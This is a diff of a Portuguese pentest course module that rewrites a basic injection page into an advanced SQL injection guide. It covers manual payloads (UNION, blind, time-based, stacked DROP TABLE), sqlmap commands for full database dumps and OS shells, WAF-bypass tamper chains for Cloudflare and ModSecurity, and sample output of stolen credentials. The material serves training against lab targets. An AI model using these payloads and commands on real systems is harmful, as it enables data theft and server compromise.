@@ -1,307 +1,447 @@
-# 💉 Injeção e Fuzzing
+# 💉 02. SQL Injection Avançado — SQLMap + Payloads Manuais
 
-> Detecção e exploração de SQL Injection e bypass de WAF.
+> SQL Injection é a vulnerabilidade mais devastadora. Com ela, você extrai bancos inteiros, assume servidores e destrói a aplicação.
 
----
+<div align="center">
 
-## 📚 O que é SQL Injection e Fuzzing?
+| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
+|:--------:|:--------:|:--------------:|
+| 80min | ⭐⭐⭐ Avançado | `sqlmap, curl, Burp Repeater` |
 
-**SQL Injection** é inserir código SQL malicioso em inputs de aplicações web para manipular o banco de dados. **Fuzzing** é enviar dados aleatórios ou malformados para encontrar vulnerabilidades em software.
-
-### Por que isso é importante?
-
-- SQLi é uma das vulnerabilidades **mais perigosas e comuns** (OWASP Top 10)
-- Permite **extrair dados sensiveis** (senhas, dados pessoais, cartões)
-- Pode conceder **shell do servidor** em casos extremos
-- Fuzzing revela bugs que testes manuais **não encontram**
-
-### Como funciona na prática?
-
-```
-Usuário insere:  admin' OR 1=1--
- 查询 original:   SELECT * FROM users WHERE user='admin'
- 查询 modificada:  SELECT * FROM users WHERE user='admin' OR 1=1--
- Resultado:       Retorna TODOS os usuários (bypass de autenticação)
-```
-
-### Ferramentas
-
-| Ferramenta | O que faz |
-|:---|:---|
-| **SQLMap** | Detecção e exploração automática de SQLi |
-| **WAFw00f** | Detecta se site usa WAF |
-| **Burp Suite** | Intercepta e manipula requests HTTP |
-| **FFUF** | Fuzzing rápido de endpoints e parâmetros |
+</div>
 
 ---
 
-## SQLMap
+## 🎓 Por que isso importa?
 
-Detecção e exploração automática de SQL Injection. Uma das ferramentas mais poderosas para web security.
+SQL Injection (SQLi) permite que você **injete código SQL malicioso** em inputs da aplicação para manipular o banco de dados. É o ataque mais antigo, mais comum e mais devastador da web.
 
-### 🎯 Quando usar o SQLMap
-Quando encontrou um parâmetro que aceita input. Use quando:
-- Precisar **testar SQL Injection** em qualquer parâmetro
-- Precisar **extrair dados** de um banco de dados
-- Precisar **listar bancos, tabelas e colunas**
-- Precisar de **shell do servidor** (em casos extremos)
-- Quiser **automatizar** a exploração de SQLi
+**Analogia:** Imagine que você preenche um formulário e a resposta vai direto para o banco de dados. Se você escrever `OR 1=1`, o banco retorna TUDO — porque a aplicação não separou seu dado do comando SQL.
 
-### 🛠️ Como o SQLMap te ajuda
-- **Detecção automática** → Descobre tipo de SQLi (error, blind, union, time)
-- **Extração** → Dump de bancos, tabelas, colunas
-- **Bypass** → Tamper scripts para bypass de WAF
-- **Shell** → OS shell, SQL shell em casos avançados
+**Impacto real:**
+- **Extração completa** de bancos de dados (senhas, dados pessoais, cartões)
+- **Autenticação bypass** — acessar sem senha
+- **RCE** — executar comandos do SO (em MySQL/MSSQL)
+- **Modificação de dados** — alterar/deletar registros
+- **Privilege escalation** — assumir controle do banco
 
-### ➡️ Depois de rodar o SQLMap — Próximos passos
-1. **SQLi confirmado?** → Liste bancos: `sqlmap -u URL --dbs --batch`
-2. **Banco encontrado?** → Liste tabelas: `sqlmap -u URL -D banco --tables --batch`
-3. **Tabelas sensíveis?** → Dump: `sqlmap -u URL -D banco -T tabela --dump --batch`
-4. **WAF bloqueando?** → Use tamper: `sqlmap -u URL --tamper=space2comment,between --batch`
-5. **Salve o output** → SQLMap salva automaticamente em `~/.sqlmap/output/`
+---
 
-### Instalação
+## 📋 Pré-requisitos
+
+| Conhecimento | Necessário? | Onde aprender |
+|:-------------|:-----------:|:-------------:|
+| SQL básico (SELECT, WHERE, UNION) | Sim | Este arquivo explica |
+| HTTP basics (GET/POST) | Sim | Módulo 00 |
+| Burp Suite (Repeater) | Sim | Arquivo 01 |
+
+---
+
+## 🎯 Quando usar SQLMap
+
+- Quando encontrou parâmetro que aceita input (URL, POST data, headers)
+- Para testar **todos os tipos de SQLi** (error, blind, union, time, stacked)
+- Para **extrair dados** automaticamente
+- Para fazer **bypass de WAF** com tamper scripts
+- Para obter **OS shell** em casos extremos
+
+---
+
+## 📋 Flags Principais do SQLMap
+
+| Flag | Descrição | Exemplo |
+|------|-----------|---------|
+| `-u` | URL com parâmetros | `-u "http://target.com/?id=1"` |
+| `--data` | Dados POST | `--data="user=admin&pass=123"` |
+| `--cookie` | Cookie de sessão | `--cookie="session=abc123"` |
+| `--batch` | Modo automático (sem perguntas) | `--batch` |
+| `--level` | Nível de testes (1-5, default 1) | `--level=5` |
+| `--risk` | Risco dos testes (1-3, default 1) | `--risk=3` |
+| `--technique` | Técnicas específicas | `--technique=BEUST` |
+| `-p` | Parâmetro específico | `-p id` |
+| `--dbs` | Listar bancos de dados | `--dbs` |
+| `--tables` | Listar tabelas | `--tables` |
+| `--columns` | Listar colunas | `--columns` |
+| `--dump` | Baixar dados | `--dump` |
+| `--dump-all` | Dump de todos os bancos | `--dump-all` |
+| `--os-shell` | Shell do SO | `--os-shell` |
+| `--sql-shell` | Shell SQL | `--sql-shell` |
+| `--tamper` | Script de bypass de WAF | `--tamper=space2comment,between` |
+| `--random-agent` | User agent aleatório | `--random-agent` |
+| `--delay` | Delay entre requests (segundos) | `--delay=1` |
+| `--threads` | Threads simultâneas | `--threads=10` |
+| `-o` | Output file | `-o result.txt` |
+| `-v` | Verbosidade (0-6) | `-v=3` |
+| `-t` | Salvar requests em arquivo | `-t requests.txt` |
+
+---
+
+## 📝 Técnicas de SQL Injection
+
+### 1. Error-Based SQLi
+
+O servidor retorna erro de SQL → dados aparecem no erro.
+
 ```bash
-sudo apt install -y sqlmap
+# Payloads
+' OR 1=1--
+' UNION SELECT NULL--
+' AND 1=CONVERT(int,@@version)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--
+
+# Testar via curl
+curl "http://target.com/page?id=1' AND 1=1--"
+# Se retornar erro de SQL → error-based SQLi
+
+# SQLMap
+sqlmap -u "http://target.com/page?id=1" --technique=E --batch
 ```
 
-### Flags principais
+### 2. Boolean-Based Blind
 
-| Flag | O que faz |
-|:---|:---|
-| `-u` | URL com parâmetros |
-| `--data` | Dados POST |
-| `--batch` | Modo automático (sem perguntas) |
-| `--level` | Nível de testes (1-5, padrão 1) |
-| `--risk` | Risco dos testes (1-3, padrão 1) |
-| `--dbs` | Listar bancos de dados |
-| `--tables` | Listar tabelas |
-| `--columns` | Listar colunas |
-| `--dump` | Baixar dados |
-| `--os-shell` | Shell do SO |
-| `--sql-shell` | Shell SQL |
-| `--cookie` | Cookie de sessão |
-| `--random-agent` | User agent aleatório |
-| `--delay` | Delay entre requests |
-| `-p` | Parâmetro específico |
-| `--tamper` | Script de bypass (WAF) |
-| `--technique` | Técnicas específicas |
-
-### Exemplos práticos
+Resposta muda dependendo de TRUE/FALSE, sem erro visível.
 
 ```bash
-# Scan básico de URL
+# Testar TRUE vs FALSE
+curl "http://target.com/page?id=1 AND 1=1"  # TRUE → resposta normal
+curl "http://target.com/page?id=1 AND 1=2"  # FALSE → resposta diferente
+
+# Se as respostas forem diferentes → blind SQLi confirmado
+
+# SQLMap
+sqlmap -u "http://target.com/page?id=1" --technique=B --batch
+```
+
+### 3. Time-Based Blind
+
+Delay na resposta indica injeção (sem retorno de dados).
+
+```bash
+# Testar delay
+curl -w "%{time_total}" -o /dev/null "http://target.com/page?id=1 AND SLEEP(5)"
+# Se tempo de resposta > 5s → time-based SQLi confirmado
+
+# MySQL
+' AND SLEEP(5)--
+' AND BENCHMARK(10000000,SHA1('test'))--
+
+# PostgreSQL
+'; SELECT pg_sleep(5)--
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5'--
+
+# SQLMap
+sqlmap -u "http://target.com/page?id=1" --technique=T --batch
+```
+
+### 4. UNION-Based
+
+Combina resultados de queries para extrair dados.
+
+```bash
+# Descobrir número de colunas
+' ORDER BY 1--   # funciona
+' ORDER BY 2--   # funciona
+' ORDER BY 3--   # erro → 2 colunas
+
+# UNION payload
+' UNION SELECT NULL,NULL--
+' UNION SELECT 1,2--
+' UNION SELECT username,password FROM users--
+
+# SQLMap
+sqlmap -u "http://target.com/page?id=1" --technique=U --batch
+```
+
+### 5. Stacked Queries
+
+Executa múltiplos statements SQL.
+
+```bash
+# Testar
+'; SELECT 1--
+'; DROP TABLE users--
+
+# SQLMap
+sqlmap -u "http://target.com/page?id=1" --technique=S --batch
+```
+
+---
+
+## 🛠️ SQLMap — Exemplos Práticos
+
+### Scan Completo
+
+```bash
+# Scan básico (todos os tipos)
 sqlmap -u "http://target.com/page?id=1" --batch
 
-# Scan mais agressivo
-sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch
+# Output esperado:
+# [*] starting @ 14:30:00
+# [INFO] testing connection to the target URL
+# [INFO] GET parameter 'id' is vulnerable.
+# Type: boolean-based blind
+# [...]
+# [INFO] the back-end DBMS is MySQL
+```
 
-# POST request
-sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch
+### Extrair Dados
 
-# Com cookie de sessão
-sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch
-
-# Listar bancos de dados
+```bash
+# Listar bancos
 sqlmap -u "http://target.com/page?id=1" --dbs --batch
 
-# Listar tabelas de um banco
-sqlmap -u "http://target.com/page?id=1" -D mydb --tables --batch
+# Output:
+# available databases [5]:
+# [*] information_schema
+# [*] mysql
+# [*] performance_schema
+# [*] target_db
+# [*] test
 
-# Listar colunas de uma tabela
-sqlmap -u "http://target.com/page?id=1" -D mydb -T users --columns --batch
+# Listar tabelas do banco target_db
+sqlmap -u "http://target.com/page?id=1" -D target_db --tables --batch
 
-# Dump de dados
-sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump --batch
+# Output:
+# Database: target_db
+# [8 tables]
+# +----------------+
+# | users          |
+# | orders         |
+# | products       |
+# | sessions       |
+# | admin          |
+# | payments       |
+# | logs           |
+# | config         |
+# +----------------+
 
-# Dump de todos os bancos
-sqlmap -u "http://target.com/page?id=1" --dump-all --batch
+# Listar colunas da tabela users
+sqlmap -u "http://target.com/page?id=1" -D target_db -T users --columns --batch
 
-# Shell interativo do SO
+# Output:
+# Table: users
+# [6 columns]
+# +----------+--------------+
+# | Column   | Type         |
+# +----------+--------------+
+# | id       | int          |
+# | username | varchar(255) |
+# | password | varchar(255) |
+# | email    | varchar(255) |
+# | role     | varchar(50)  |
+# | created  | datetime     |
+# +----------+--------------+
+
+# Dump da tabela users
+sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump --batch
+
+# Output:
+# +----+----------+---------------------------------------------+-------------------+-------+---------------------+
+# | id | username | password                                    | email             | role  | created             |
+# +----+----------+---------------------------------------------+-------------------+-------+---------------------+
+# | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 (md5)    | admin@target.com  | admin | 2024-01-15 10:30:00 |
+# | 2  | user1    | 482c811da5d5b4bc6d497ffa98491e38            | user1@email.com   | user  | 2024-01-16 14:20:00 |
+# +----+----------+---------------------------------------------+-------------------+-------+---------------------+
+```
+
+### POST Request
+
+```bash
+# Login form
+sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --batch
+
+# Cookie de sessão
+sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch
+
+# User agent customizado
+sqlmap -u "http://target.com/page?id=1" --random-agent --batch
+```
+
+### OS Shell
+
+```bash
+# Shell do SO (MySQL com root)
 sqlmap -u "http://target.com/page?id=1" --os-shell --batch
 
-# Shell SQL
-sqlmap -u "http://target.com/page?id=1" --sql-shell --batch
-
-# Parâmetro específico
-sqlmap -u "http://target.com/page?id=1&name=test" -p id --batch
-
-# User agent aleatório
-sqlmap -u "http://target.com/page?id=1" --random-agent --batch
-
-# Com delay (evitar bloqueio)
-sqlmap -u "http://target.com/page?id=1" --delay=1 --batch
-
-# Bypass WAF com tamper
-sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --batch
-
-# Techniques específicas
-sqlmap -u "http://target.com/page?id=1" --technique=BEU --batch
-# B = Boolean-based blind
-# E = Error-based
-# U = UNION query
-# S = Stacked queries
-# T = Time-based blind
+# Output:
+# [INFO] the back-end DBMS is MySQL
+# [INFO] fetching server OS shell
+# [04:30:00] [INFO] OS shell> id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-### Técnicas de SQL Injection
+---
 
-| Tipo | Como o SQLMap detecta |
-|:---|:---|
-| **Error-based** | Erros de SQL visíveis na resposta |
-| **Boolean-based blind** | Resposta muda dependendo de TRUE/FALSE |
-| **Time-based blind** | Delay na resposta indica injeção |
-| **UNION query** | Combina resultados de queries |
-| **Stacked queries** | Executa múltiplos statements |
+## 🛡️ Bypass de WAF com Tamper Scripts
 
-### Bypass de WAF
+### Scripts Comuns
+
+| Script | O que faz |
+|--------|-----------|
+| `space2comment` | Espaço → `/**/` |
+| `between` | `>` → `NOT BETWEEN 0 AND` |
+| `randomcase` | `SELECT` → `sElEcT` |
+| `charencode` | `SELECT` → `%53%45%4C%45%43%54` |
+| `equaltolike` | `=` → `LIKE` |
+| `greatest` | `>` → `GREATEST(1,2)` |
+| `apostrophemask` | `'` → `%EF%BC%87` |
+| `space2plus` | Espaço → `+` |
+| `halfversionedmorekeywords` | `SELECT` → `/*!SELECT*/` |
+
+### Exemplos de Tamper
+
 ```bash
-# Space to comment
-sqlmap -u "URL" --tamper=space2comment
-
-# Entre bins
-sqlmap -u "URL" --tamper=between
+# Espaço para comentário
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment --batch
 
 # Múltiplos tamper
-sqlmap -u "URL" --tamper=space2comment,between,randomcase
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase --batch
+
+# Para Cloudflare
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase,charencode --batch
+
+# Para ModSecurity
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,equaltolike,randomcase --batch
 ```
 
----
-
-## WAFw00f
-
-Detecta se o site usa WAF (Web Application Firewall) e qual modelo.
-
-### 🎯 Quando usar o WAFw00f
-Antes de qualquer ataque web. Use quando:
-- Precisar saber **se o site tem WAF**
-- Precisar saber **qual modelo de WAF** (Cloudflare, ModSecurity, etc)
-- Precisar **adaptar seus ataques** antes de testar
-- Quiser **evitar bloqueios** durante o pentest
-
-### 🛠️ Como o WAFw00f te ajuda
-- **Detecção** → Saber se tem WAF antes de atacar
-- **Modelo** → Cloudflare, ModSecurity, Imperva (cada um tem bypass diferente)
-- **Estratégia** → Com WAF: usar tamper, rate limit, proxychains
-
-### ➡️ Depois de rodar o WAFw00f — Próximos passos
-1. **WAF detectado?** → Use tamper no SQLMap: `--tamper=space2comment,between`
-2. **Cloudflare?** → Use proxychains ou encontre IP real com `curl -I`
-3. **ModSecurity?** → Use payloads específicos de bypass
-4. **Sem WAF?** → Pode atacar livremente (mas com cuidado!)
-
-### Instalação
-```bash
-sudo pip3 install wafw00f
-```
-
-### Flags principais
-
-| Flag | O que faz |
-|:---|:---|
-| `-a` | Todos os testes |
-| `-l` | Listar WAFs suportados |
-| `-p` | Proxy |
-| `-o` | Output |
-| `-f` | Output format (json, txt) |
-| `-v` | Verbose |
-
-### Exemplos práticos
+### Payloads Manuais de Bypass
 
 ```bash
-# Detectar WAF
-wafw00f example.com
+# Espaço → /**/
+'/**/OR/**/1=1--
 
-# Todos os testes
-wafw00f -a example.com
+# Espaço → %20
+'%20OR%201=1--
 
-# Listar WAFs suportados
-wafw00f -l
+# Case variation
+' oR 1=1--
 
-# Com proxy
-wafw00f -p http://127.0.0.1:8080 example.com
+# Inline comment
+'/*!UNION*//*!SELECT*/ 1,2,3--
 
-# Output JSON
-wafw00f -o output.json -f json example.com
+# Duplicate keywords
+'UNION SELECT SELECT 1,2--
 
-# Verbose
-wafw00f -v example.com
+# Char encoding
+' UNION SELECT 0x757365726E616D65--
+
+# MySQL
+' /*!50000UNION*/ SELECT 1,2--
 ```
-
-### Por que isso importa
-Se o site tem WAF, você precisa adaptar seus ataques:
-- Usar tamper no SQLMap
-- Usar rate limiting mais baixo
-- Usar proxychains para esconder IP
-- Bypass de WAF com payloads específicos
 
 ---
 
-### Resumo da ordem — Por que essa sequência?
-
-Injeção segue a ordem: **detectar → automatizar → explorar → extrair**.
+## 📋 Fluxo de Teste SQLi
 
 ```
-PASSO 1: Testar manualmente → Confirmar que SQLi existe
-├── POR QUE: Automático pode dar falso positivo, manual confirma
-├── O QUE FAZER: Inserir ' OR 1=1 -- e ver se muda comportamento
-├── QUANDO AVANÇAR: Quando tiver certeza que há injeção
-└── SE DER ERRADO: Se não funcionar, tente aspas dupla, UNION, blind
-
-        ↓
-
-PASSO 2: SQLMap → Automatizar a exploração
-├── POR QUE: Manual é lento, SQLMap testa todos os tipos
-├── COMANDO: sqlmap -u "http://target.com/page?id=1" --batch
-├── QUANDO AVANÇAR: Quando SQLMap confirmar SQLi
-└── SE DER ERRADO: Se não detectar, aumente: --level=5 --risk=3
-
-        ↓
-
-PASSO 3: Extrair dados → Pegar informações do banco
-├── POR QUE: O objetivo é acessar dados sensiveis
-├── COMANDO: sqlmap -u "URL" --dbs --tables --dump
-├── QUANDO AVANÇAR: Quando tiver dados extraidos
-└── DICAS: Comece por banco 'mysql' ou 'information_schema'
-
-        ↓
-
-PASSO 4: WAF Bypass → Se tiver WAF bloqueando
-├── POR QUE: WAF pode bloquear payloads padrão
-├── COMANDO: sqlmap -u "URL" --tamper=space2comment,between
-├── QUANDO PARAR: Quando conseguir extrair dados
-└── DICAS: Teste um tamper por vez para qual funciona
+┌─────────────────────────────────────────────────────────┐
+│  1. TESTAR MANUALMENTE                                   │
+│     - ' OR 1=1--                                         │
+│     - ' UNION SELECT NULL--                              │
+│     - ' AND SLEEP(5)--                                   │
+│     - Confirmar que SQLi existe                           │
+└─────────────────────────┬───────────────────────────────┘
+                          ▼
+┌─────────────────────────────────────────────────────────┐
+│  2. SQLMAP SCAN                                          │
+│     sqlmap -u "URL" --batch                              │
+│     Identificar tipo de SQLi e DBMS                       │
+└─────────────────────────┬───────────────────────────────┘
+                          ▼
+┌─────────────────────────────────────────────────────────┐
+│  3. ENUMERAR                                             │
+│     --dbs → --tables → --columns                         │
+│     Identificar tabelas sensíveis                         │
+└─────────────────────────┬───────────────────────────────┘
+                          ▼
+┌─────────────────────────────────────────────────────────┐
+│  4. EXTRAIR                                              │
+│     -T users --dump                                      │
+│     Quebrar hashes (hashcat, john)                       │
+│     Acessar todas as contas                               │
+└─────────────────────────┬───────────────────────────────┘
+                          ▼
+┌─────────────────────────────────────────────────────────┐
+│  5. ESCALAR                                              │
+│     --os-shell (se MySQL root)                           │
+│     --sql-shell (executar queries arbitrárias)            │
+│     Read/write files (LOAD_FILE, INTO OUTFILE)           │
+└─────────────────────────────────────────────────────────┘
 ```
-
-**Dica:** Sempre teste SQLi manualmente antes de usar SQLMap — evita falsos positivos.
 
 ---
 
-## Lab Prático
+## ❌ Erros Comuns
 
-### Exercício 1: SQL Injection com SQLMap
-- **Plataforma:** TryHackMe
-- **Link:** https://tryhackme.com/room/sqlinjectionlm
-- **O que vai praticar:** Detecção automática de SQLi, extração de dados, bypass de WAF e exploração de bancos
-- **Tempo estimado:** 60 minutos
+| Erro | Solução |
+|------|---------|
+| "SQLMap não detecta" | Aumentar: `--level=5 --risk=3` |
+| "WAF bloqueia" | Usar tamper: `--tamper=space2comment,between` |
+| "Timeout" | Aumentar timeout: `--timeout=30` |
+| "Muitos falsos positivos` | Testar manualmente antes de confiar |
+| "Não consigo shell" | MySQL precisa ser root e ter FILE privilege |
 
-### Exercício 2: DVWA - SQL Injection
-- **Plataforma:** TryHackMe
-- **Link:** https://tryhackme.com/room/dvwa
-- **O que vai praticar:** SQL Injection manual e automatizada, union-based, blind SQLi e uso do SQLMap
-- **Tempo estimado:** 45 minutos
+---
 
-### Exercício 3: WAF Bypass
-- **Plataforma:** TryHackMe
-- **Link:** https://tryhackme.com/room/wafbypass
-- **O que vai praticar:** Técnicas de bypass de WAF, tamper scripts e evasão de firewalls aplicativos
-- **Tempo estimado:** 40 minutos
+## 📋 Cheat Sheet Rápido
 
-### Exercício 4: Injection Foundations
-- **Plataforma:** HackTheBox
-- **Link:** https://app.hackthebox.com/starting-point
-- **O que vai praticar:** SQL Injection básica, identificação de vulnerabilidades e extração de dados sensiveis
-- **Tempo estimado:** 90 minutos
+### Scan Completo (copiar e colar)
 
-### Dica de Estudo
-> Comece sempre pelo SQLMap em modo `--batch` para detecção rápida. Depois, prague manualmente com payloads básicos (`' OR 1=1 --`). Documente cada técnica encontrada e对应的 WAF (se houver). Use tamper scripts para bypass quando necessário.
+```bash
+# Básico
+sqlmap -u "http://target.com/page?id=1" --batch
+
+# Agressivo
+sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch
+
+# POST
+sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --batch
+
+# Com cookie
+sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch
+
+# Extrair tudo
+sqlmap -u "http://target.com/page?id=1" --dump-all --batch
+
+# Shell
+sqlmap -u "http://target.com/page?id=1" --os-shell --batch
+```
+
+---
+
+## 🧪 Labs Práticos
+
+| # | Plataforma | Lab | Tópicos | Tempo |
+|---|:----------:|:----|:--------|:-----:|
+| 1 | PortSwigger | [SQL injection](https://portswigger.net/web-security/sql-injection) | SQLi básico | 15min |
+| 2 | PortSwigger | [SQL injection — UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks) | UNION-based | 20min |
+| 3 | PortSwigger | [SQL injection — blind](https://portswigger.net/web-security/sql-injection/blind) | Blind SQLi | 20min |
+| 4 | PortSwigger | [SQL injection — out-of-band](https://portswigger.net/web-security/sql-injection/out-of-band) | OOB SQLi | 25min |
+| 5 | PortSwigger | [SQL injection — filter bypass](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-obsolete-encoding) | WAF bypass | 20min |
+
+---
+
+## 📚 Referências
+
+- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
+- [SQLMap Documentation](https://sqlmap.org/)
+- [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
+- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+
+---
+
+## ✅ Validação
+
+Após este módulo, você deve conseguir:
+
+- [ ] Testar SQLi manualmente (error, blind, union, time-based)
+- [ ] Usar SQLMap para detecção e extração automatizada
+- [ ] Enumerar bancos, tabelas e colunas com SQLMap
+- [ ] Fazer dump de dados sensíveis
+- [ ] Bypass de WAF com tamper scripts
+- [ ] Obter OS shell via SQLMap (MySQL root)
+- [ ] Usar payloads manuais de bypass
+- [ ] Completar todos os labs PortSwigger de SQL Injection
